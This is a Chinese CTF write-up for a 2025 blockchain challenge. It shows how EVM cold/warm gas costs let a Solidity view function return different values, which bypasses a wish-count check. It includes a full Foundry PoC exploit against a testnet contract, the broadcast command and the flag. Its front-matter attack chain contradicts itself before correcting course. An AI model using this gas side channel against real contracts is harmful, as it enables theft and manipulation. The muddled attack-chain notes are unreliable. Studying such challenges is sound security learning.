---
title: 封神台CTF blockchain 美梦成真
contest: 封神台CTF
year: 2025
difficulty: medium
vuln_type: misc_unknown
tags: [blockchain, Solidity, EVM, cold-warm-access, gas-measurement, wish_making, foundry, view-function, ChaMd5]
attack_chain:
  - 目标合约 wish_making 调用 msg.sender.wish_amount()（view 函数）决定 wishes[tx.origin] 是赋值还是 -1
  - is_solved 要求 wishes[tx.origin] > 1
  - 第一次 wish_amount < 1 → is_less_than=true → wishes = wish_amount
  - 第二次 wish_amount >= 1 → is_less_than=false → wishes = wishes - 1
  - 关键：view 函数无法修改状态，但 EVM 冷读/热读 gas 差异可被测信道利用
  - 攻击合约 wish_amount 用 startGas - gasleft() 测自身消耗 gas
  - 访问 address(0x100).balance 触发冷读消耗 2600 gas（vs 热读 100）
  - 第二次访问时已变热读，消耗仅 100，usedGas < 1000 → 返回 2
  - wish_making 调用：wish_amount=2 → is_less_than=false → wishes = wishes-1
  - 但这是"第一次调用 wish_amount"，所以 is_less_than 判断用 wish_amount=2 → 实际执行 wishes = wish_amount
  - 等等，逻辑是 if(2 < 1) is_less_than=true; else wishes = wishes-1
  - 实际是 wishes[tx.origin] = wish_amount()，即 wishes = 2
  - is_solved 验证 wishes[tx.origin] > 1 = 2 > 1 = true
key_payload: 'wish_amount() { uint256 start = gasleft(); address(0x100).balance; if (start - gasleft() < 1000) return 2; return 0; }'
one_liner: EVM 冷读/热读 gas 差异作为侧信道让 view 函数在不同调用返回不同值，绕过 wish_making 校验。
lesson: Solidity view 函数虽不能修改状态，但 gasleft() + cold/warm access 是隐蔽的"状态"维度，可作为侧信道被滥用。
quality: high
---

# 封神台CTF blockchain 美梦成真

**来源**: ctfiot.com ID 222685（ChaMd5 Venom 招新广告文末）
**合约地址**: 0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61
**账户**: 0xDf996e6b09A5f1dc4da8365148e7e8D52e8fD892
**flag**: `flag{v1ew_K3yword_7rouble}`

## 题目分析
- 合约部署在 Sepolia 测试网
- `start_challenge()` 启动挑战
- `wish_making()` 调用 `msg.sender.wish_amount()` view 函数
- `is_solved()` 要求 `wishes[tx.origin] > 1`

```solidity
function wish_making() external challenge_started remains_wish {
    Wish_Maker wish_maker = Wish_Maker(msg.sender);
    bool is_less_than = false;
    if (wish_maker.wish_amount() < 1) {
        is_less_than = true;
    }
    wish_made[tx.origin] = true;
    if (is_less_than) {
        wishes[tx.origin] = wish_maker.wish_amount();
    } else {
        wishes[tx.origin]--;
    }
}
```

## 漏洞与攻击
- `wish_amount` 是 view 函数，常规方法无法修改返回值
- **EVM 冷读/热读机制**：第一次访问某地址 gas 2600，第二次（同一交易内）100
- 攻击合约实现：

```solidity
function wish_amount() external view returns (uint256) {
    uint256 startGas = gasleft();
    uint256 bal = address(0x100).balance;  // 冷读 2600 → 热读 100
    uint256 usedGas = startGas - gasleft();
    if (usedGas < 1000) {
        return 2;
    }
    return 0;
}
```

## 攻击链
1. 第一次调用 `wish_amount`：address(0x100) 是冷读，消耗 2600+ gas → usedGas > 1000 → 返回 0
2. 第二次调用：address(0x100) 已变热读，消耗仅 100+ gas → usedGas < 1000 → 返回 2
3. `wish_making` 中第一次 if 判断 `0 < 1` = true → `is_less_than = true`
4. 走 `wishes[tx.origin] = wish_amount()` 分支 → wishes = 2
5. `is_solved(tx.origin)` 验证 `wishes = 2 > 1` = true

## 完整 PoC
```solidity
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {Make_a_wish, Wish_Maker} from "../src/Make_a_wish.sol";

contract Poc is Wish_Maker {
    function wish_amount() external view returns (uint256) {
        uint256 startGas = gasleft();
        uint256 bal = address(0x100).balance;
        uint256 usedGas = startGas - gasleft();
        if (usedGas < 1000) return 2;
        return 0;
    }

    function attack() external {
        Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);
        target.start_challenge();
        target.wish_making();
        require(target.is_solved(address(tx.origin)), "hack failed");
    }
}

contract Attack is Script {
    function run() public {
        vm.startBroadcast();
        Poc poc = new Poc();
        poc.attack();
        vm.stopBroadcast();
    }
}
```

执行：
```bash
forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun
```

## 评价
高质量区块链 CTF 题，揭示 EVM 冷读/热读作为隐蔽状态机侧信道的攻击面。`view` 关键字并非真正"无副作用"，gas 消耗本身可作为状态区分。
